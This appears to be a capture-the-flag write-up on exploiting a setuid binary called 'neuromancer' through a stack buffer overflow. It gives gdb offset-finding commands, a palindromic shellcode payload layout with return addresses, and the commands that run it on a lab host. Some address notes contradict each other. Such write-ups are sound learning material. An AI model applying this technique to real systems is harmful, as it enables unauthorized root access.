# 2362e5_binary_exploitation



```
-r-sr-xr-- 1 root  blade 11152 Aug 29 00:07 neuromancer*

blade@en2720-w1-buckeye:~$ file neuromancer
neuromancer: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7205a1743b8d5fe771346009d5d33457004eaa77, with debug_info, not stripped
````

Obviously, it is SUID privilege escalation challenge and buffer overflow is the way to go.


Using buffer overflow, we can overwrite the return address of the function to point to our shellcode. Because of 64-bit architecture, we use `rip` and `rsp` registers
* rip: instruction pointer
* rsp: stack pointer

Now, we need to find the address of return pointer as return pointer points to next instruction we can make cpu execute any instruction just by replacing return pointer with correct address. Gradually increase the size of input.
```
gdb ./neuromancer
> disas  main
> break neuromancer.c:44
> run $(python3 -c "print('\x41'*148)") 
> x/200xb $rsp  # the buffer address starts at 0x7fffffffe3c0, it is 6 bytes.



> run $(python3 -c "print('\x41'*158)") 
> 0x0000414141414141 in ?? ()   # we find the return pointer is overwritten with 6 bytes of 'A'.
> info frame

All payload: 158 bytes
buffer: 128 bytes
alignment: 16 bytes
rbp: 8 bytes
return pointer: 6 bytes

```

Next, we need to make the exploit. Usually, the exploit is `nop + shellcode + junk/nop + return_addr`. But here we need to build a Palindrome. There are a few shellcode available online. I used [https://www.exploit-db.com/exploits/13320] one 48 bytes.
```
# the return address should be before the shellcode
# I pick 0x7fffffffe3f8 address as return address
# 0x7fffffffe3c8 - 0x7fffffffe3c0 = 8 bytes
reverse_return_addr(6) + nop(25) + shellcode(48) + reverse_shellcode + nop + return_addr

# the buffer address starts at 0x7fffffffe3f0, which is different from 0x7fffffffe3c0. So the start address of buff is different when using gdb and when running the program normally.
# so we change the return address to 0x7fffffffe3f8

# The most CPUs we use daily are little endian. It means we have to put the address in reverse order of bytes. 
```



```
# kali machine
scp -P 52961 -i id_rsa_blade solve.py blade@10.0.7.225:/home/blade/

# the target 10.0.7.225
./neuromancer $(python3 solve.py)

```

reference:
* https://ret2rop.blogspot.com/2018/08/stack-based-buffer-overflow-x64.html
* https://ravi5hanka.medium.com/privilege-escalation-in-linux-via-a-local-buffer-overflow-dcee4f9b4a49